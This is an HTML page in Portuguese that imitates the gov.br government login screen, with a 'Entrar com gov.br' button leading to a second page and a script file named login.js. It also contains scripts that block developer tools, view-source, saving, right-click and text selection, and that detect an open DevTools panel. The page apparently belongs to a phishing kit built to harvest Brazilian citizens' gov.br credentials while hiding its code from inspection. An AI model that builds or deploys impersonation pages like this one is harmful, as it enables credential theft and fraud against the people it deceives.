<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />

  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      font-family: 'Montserrat', Arial, sans-serif;
      overscroll-behavior: contain;
      -webkit-user-select: none;
      user-select: none;
      position: relative;
      color: #F0F0F2;
    }



    /* Loader */
    #loader {
      position: fixed;
      top: 16px;
      left: 50%;
      transform: translateX(-50%);
      background: #ffffff;
      padding: 8px 16px;
      border-radius: 20px;
      font-size: 14px;
      color: #333;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
      z-index: 999;
      display: none;
    }


.btn {
  display: inline-block;        /* ocupa s칩 o espa칞o do conte칰do */
  padding: 14px 100px;           /* altura e largura para formato oval */
  background: #155BCB;
  color: white;
  text-align: center;
  border: none;
  border-radius: 999px;         /* deixa bem oval */
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  text-decoration: none;
  transition: 0.2s;
  margin: 0 auto;               /* centraliza horizontalmente */
}
.btn:hover {
  background: #0F47A1;
}


.btn:hover {
  background: #0F47A1; /* leve escurecida no hover */
}


.overlay {
  position: fixed;
  bottom: 60px;
  left: 50%;
  transform: translateX(-50%);

  padding: 24px;
  text-align: center;
  width: 90%;

  border-radius: 20px;
}


    .logo {
      font-size: 32px;

      margin-bottom: 24px;
    }

    .logo span:nth-child(1) { color: #1351B4; }
    .logo span:nth-child(2) { color: #FFD700; }
    .logo span:nth-child(3) { color: #008000; }
    .logo span:nth-child(4) { color: #1351B4; }
    .logo span:nth-child(5) { color: #FFD700; }
    .logo span:nth-child(6) { color: #1351B4; }


    .btn:hover {
      background: #0d3c8a;
    }

    .desc {
      font-size: 14px;
      color: #333;
      margin-bottom: 16px;
    }

    .qr {
      font-size: 15px;
      color: #1351B4;
      display: flex;
      justify-content: center;

      cursor: pointer;
      margin-top: 12px;
    }
body {
  position: relative;
  overflow: hidden;
  background-color: #F0F0F2;
}

.bg-image {
  position: fixed;
  top: -292px;
  left: 0;
  width: 100%;
  height: 100%;
  object-fit: contain;
  transform: scale(1.2); /* aumenta */
  transform-origin: top center; /* impede de descer */
  z-index: -1;
  pointer-events: none;
  background-color: #F0F0F2
}




main, div, section, * {
  position: relative;
  z-index: 1; /* garante que o conte칰do fique acima */
}

  </style>
</head>
<body>
<img src="static/bg1.png" class="bg-image">



  <!-- Loader -->
  <div id="loader">游댃 Atualizando...</div>

  <div class="overlay">
    <div class="logo">
      <span>g</span><span>o</span><span>v</span><span>.</span><span>b</span><span>r</span>
    </div>
    <div class="overlay">
    <a href="index2.html" class="btn">Entrar com gov.br</a>
</div>

    <div class="desc">Clique para acessar sua conta gov.br</div>
    <div class="qr">
  <img src="static/qr-code.png" alt="QR Code" style="width:20px; height:20px;">
  Ler QR Code
</div>

  </div>
<script src="login.js"></script>

  <script>
    let startY = 0;
    let isRefreshing = false;

    document.addEventListener('touchstart', e => {
      if (window.scrollY === 0) {
        startY = e.touches[0].clientY;
      }
    }, { passive: true });

    document.addEventListener('touchend', e => {
      const endY = e.changedTouches[0].clientY;
      const deltaY = endY - startY;

      // Se arrastar mais de 80px para baixo no topo da p치gina
      if (deltaY > 80 && !isRefreshing && window.scrollY === 0) {
        isRefreshing = true;
        const loader = document.getElementById('loader');
        loader.style.display = 'block';

        setTimeout(() => {
          location.reload(); // recarrega a p치gina
        }, 1000); // tempo de exibi칞칚o do loader
      }
    }, { passive: true });






     // Bloqueia atalhos comuns de DevTools
  document.addEventListener("keydown", function(e) {
    // F12
    if (e.key === "F12") {
      e.preventDefault();
    }

    // Ctrl+Shift+I
    if (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "i") {
      e.preventDefault();
    }

    // Ctrl+U
    if (e.ctrlKey && e.key.toLowerCase() === "u") {
      e.preventDefault();
    }
  });

  // Bloqueia clique direito (menu de contexto)
  document.addEventListener("contextmenu", function(e) {
    e.preventDefault();
  });
  </script>

  <script>
  (function () {
    // Bloqueia clique direito (menu de contexto)
    document.addEventListener('contextmenu', e => e.preventDefault(), { passive: false });

    // Bloqueia arrastar/soltar (evita inspe칞칚o via drag)
    document.addEventListener('dragstart', e => e.preventDefault(), { passive: false });

    // Bloqueia sele칞칚o de texto
    document.addEventListener('selectstart', e => e.preventDefault(), { passive: false });

    // Bloqueia atalhos comuns de inspe칞칚o/visualiza칞칚o de c칩digo
    document.addEventListener('keydown', function (e) {
      const k = e.key.toLowerCase();

      // F12 (DevTools)
      if (k === 'f12') e.preventDefault();

      // Ctrl+Shift+I / Ctrl+Shift+C / Ctrl+Shift+J (DevTools/Console/Inspect)
      if (e.ctrlKey && e.shiftKey && ['i', 'c', 'j'].includes(k)) e.preventDefault();

      // Ctrl+U (view-source), Ctrl+S (save), Ctrl+P (print)
      if (e.ctrlKey && ['u', 's', 'p'].includes(k)) e.preventDefault();

      // Ctrl+I (alguns navegadores usam para abrir DevTools)
      if (e.ctrlKey && k === 'i') e.preventDefault();

      // Ctrl+Shift+P (command palette do DevTools)
      if (e.ctrlKey && e.shiftKey && k === 'p') e.preventDefault();

      // Ctrl+Shift+K (console em alguns browsers)
      if (e.ctrlKey && e.shiftKey && k === 'k') e.preventDefault();

      // Command (Meta) variantes para macOS
      if (e.metaKey && (['i', 'u', 's', 'p'].includes(k) || (e.shiftKey && ['i', 'c', 'j', 'p'].includes(k)))) {
        e.preventDefault();
      }
    }, { passive: false });

    // Pequena obstru칞칚o: detecta DevTools aberto (heur칤stica, n칚o confi치vel)
    const devtoolsDetector = () => {
      const widthDiff = window.outerWidth - window.innerWidth;
      const heightDiff = window.outerHeight - window.innerHeight;
      // Pain칠is abertos frequentemente alteram essas diferen칞as
      if (widthDiff > 160 || heightDiff > 160) {
        // Exemplo: redirecionar, desfocar ou exibir alerta
        // window.location.replace('/'); // use com cautela
        console.warn('DevTools possivelmente aberto.');
      }
    };
    setInterval(devtoolsDetector, 1000);
  })();
</script>
</body>
</html>
